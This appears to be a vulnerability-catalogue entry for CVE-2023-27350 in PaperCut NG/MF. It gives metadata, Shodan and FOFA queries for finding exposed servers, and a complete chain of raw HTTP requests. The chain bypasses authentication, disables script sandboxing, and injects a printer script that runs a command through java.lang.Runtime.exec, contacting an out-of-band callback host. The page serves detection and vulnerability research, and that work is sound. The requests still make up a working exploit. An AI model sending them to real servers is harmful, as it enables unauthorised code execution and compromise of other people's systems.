---
layout: "post"
cve_id: "CVE-2023-27350"
title: "PaperCut - Unauthenticated Remote Code Execution"
pcap: true
pcap_path: "/pcaps/2023/CVE-2023-27350.pcap"
nuclei_url: "https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-27350.yaml"
author: "rootxharsh,iamnoooob,pdresearch"
severity: "critical"
impact: "Successful exploitation of this vulnerability could allow an attacker to execute arbitrary code on the target system.
"
remediation: "Apply the latest security patches or updates provided by the vendor to mitigate this vulnerability.
"
reference:
  - "https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise/"
  - "https://nvd.nist.gov/vuln/detail/CVE-2023-27350"
  - "https://www.papercut.com/kb/Main/PO-1216-and-PO-1219"
  - "https://www.zerodayinitiative.com/advisories/ZDI-23-233/"
  - "http://packetstormsecurity.com/files/171982/PaperCut-MF-NG-Authentication-Bypass-Remote-Code-Execution.html"
classification:
  cvss-metrics: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
  cvss-score: 9.8
  cve-id: "CVE-2023-27350"
  cwe-id: "CWE-284,NVD-CWE-Other"
  epss-score: 0.94257
  epss-percentile: 0.99927
  cpe: "cpe:2.3:a:papercut:papercut_mf:*:*:*:*:*:*:*:*"
metadata:
  verified: True
  max-request: 10
  vendor: "papercut"
  product: "papercut_mf"
  shodan-query: ['http.html:"PaperCut"', 'http.html:"papercut"', 'http.html:"content=\\"papercut\\""', 'cpe:"cpe:2.3:a:papercut:papercut_mf"']
  fofa-query: ['body="papercut"', 'body="content=\\"papercut\\""']
tags:
  - "cve2023"
  - "cve"
  - "packetstorm"
  - "papercut"
  - "rce"
  - "oast"
  - "unauth"
  - "kev"
  - "vkev"
  - "vuln"
snort2_rule: |
  N/A
snort3_rule: |
  N/A
---


## üîç Vulnerability Description
This vulnerability allows remote attackers to bypass authentication on affected installations of PaperCut NG 22.0.5 (Build 63914). Authentication is not required to exploit this vulnerability. The specific flaw exists within the SetupCompleted class. The issue results from improper access control. An attacker can leverage this vulnerability to bypass authentication and execute arbitrary code in the context of SYSTEM. Was ZDI-CAN-18987.


## üåê HTTP Request
```nohighlight
GET /app?service=page/SetupCompleted HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36
Connection: close
Accept-Encoding: gzip
```

```nohighlight
POST /app HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF
Connection: close
Content-Length: 129
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FSetupCompleted%2F%24Form&sp=S0&Form0=%24Hidden%2CanalyticsEnabled%2C%24Submit&%24Hidden=true&%24Submit=Login
```

```nohighlight
POST /app HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1 Safari/605.1.15
Connection: close
Content-Length: 156
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FConfigEditor%2FquickFindForm&sp=S0&Form0=%24TextField%2CdoQuickFind%2Cclear&%24TextField=print-and-device.script.enabled&doQuickFind=Go
```

```nohighlight
POST /app HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Content-Length: 136
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FConfigEditor%2F%24Form&sp=S1&Form1=%24TextField%240%2C%24Submit%2C%24Submit%240&%24TextField%240=Y&%24Submit=Update
```

```nohighlight
POST /app HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763
Connection: close
Content-Length: 147
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FConfigEditor%2FquickFindForm&sp=S0&Form0=%24TextField%2CdoQuickFind%2Cclear&%24TextField=print.script.sandboxed&doQuickFind=Go
```

```nohighlight
POST /app HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36
Connection: close
Content-Length: 136
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FConfigEditor%2F%24Form&sp=S1&Form1=%24TextField%240%2C%24Submit%2C%24Submit%240&%24TextField%240=N&%24Submit=Update
```

```nohighlight
GET /app?service=page/PrinterList HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0
Connection: close
Content-Length: 26
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=page%2FPrinterList
```

```nohighlight
POST /app?service=direct/1/PrinterList/selectPrinter&sp=wAI0tk HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Connection: close
Content-Length: 58
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FPrinterList%2FselectPrinter&sp=wAI0tk
```

```nohighlight
POST /app HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36
Connection: close
Content-Length: 64
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FPrinterDetails%2FprinterOptionsTab.tab&sp=4
```

```nohighlight
POST /app HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Knoppix; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Connection: close
Content-Length: 403
Content-Type: application/x-www-form-urlencoded
Origin: http://www.victim.com
Accept-Encoding: gzip

service=direct%2F1%2FPrinterDetails%2F%24PrinterDetailsScript.%24Form&sp=S0&Form0=printerId%2CenablePrintScript%2CscriptBody%2C%24Submit%2C%24Submit%240%2C%24Submit%241&printerId=wAI0tk&enablePrintScript=on&scriptBody=function+printJobHook%28inputs%2C+actions%29+%7B%7D%0D%0Ajava.lang.Runtime.getRuntime%28%29.exec%28%27nslookup d4t93fple0o2si4eho5gg64chstds1u5r.oast.online%27%29%3B&%24Submit%241=Apply
```


